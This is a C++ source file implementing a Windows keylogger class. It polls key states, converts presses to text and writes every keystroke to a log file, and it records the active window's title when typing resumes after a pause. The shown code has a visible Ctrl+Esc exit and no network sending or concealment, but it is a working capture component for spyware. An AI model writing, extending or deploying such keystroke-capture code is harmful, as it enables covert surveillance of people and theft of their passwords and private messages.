#include "keywatch/app/keylogger.hpp"

#include <ctime>
#include <iomanip>
#include <psapi.h>
#include <sstream>
#include <windows.h>

#include "keywatch/input/key_to_string.hpp"

namespace keywatch::app {

Keylogger::Keylogger(std::string log_path)
    : logger_(std::move(log_path)),
      last_activity_(std::chrono::steady_clock::now()) {}

Keylogger::~Keylogger() { stop(); }

void Keylogger::handle_backspace() {
  if (!storage_.empty()) {
    storage_.pop_back();
  }
}

std::string Keylogger::get_active_window_title() const {
  HWND hwnd = GetForegroundWindow();
  if (!hwnd)
    return "Unknown";

  char title[256];
  GetWindowTextA(hwnd, title, sizeof(title));
  return std::string(title);
}

void Keylogger::log_with_timestamp(const std::string &text) {
  auto now = std::chrono::system_clock::now();
  auto time_t_now = std::chrono::system_clock::to_time_t(now);

  std::stringstream ss;
  ss << std::put_time(std::localtime(&time_t_now), "[%Y-%m-%d %H:%M:%S] ");
  ss << text;

  logger_.write(ss.str());
}

void Keylogger::run() {
  // Virtual-key codes worth polling span 8 (VK_BACK) to 190 (VK_OEM_PERIOD).
  while (running_) {
    bool key_pressed = false;

    for (int key = 8; key <= 190; key++) {
      // 0x0001 = key transitioned to pressed since the last poll.
      if (GetAsyncKeyState(key) & 0x0001) {
        key_pressed = true;

        // Log window title on first keypress of a new session
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
            now - last_activity_);
        if (elapsed.count() > 5) { // If more than 5 seconds inactive
          std::string title = get_active_window_title();
          if (!title.empty()) {
            std::string msg = "\n[Window: " + title + "]\n";
            storage_ += msg;
            logger_.write(storage_);
          }
        }
        last_activity_ = now;

        if (key == VK_BACK) {
          handle_backspace();
          logger_.write(storage_);
        } else if (key == VK_ESCAPE &&
                   (GetAsyncKeyState(VK_CONTROL) & 0x8000)) {
          // Ctrl+Esc to exit
          running_ = false;
          break;
        } else {
          std::string ks = input::key_to_string(key);
          if (!ks.empty()) {
            storage_ += ks;
            logger_.write(storage_);
          }
        }
      }
    }

    // Small delay to prevent 100% CPU usage
    std::this_thread::sleep_for(std::chrono::milliseconds(POLL_DELAY_MS));
  }
}

void Keylogger::stop() { running_ = false; }

} // namespace keywatch::app
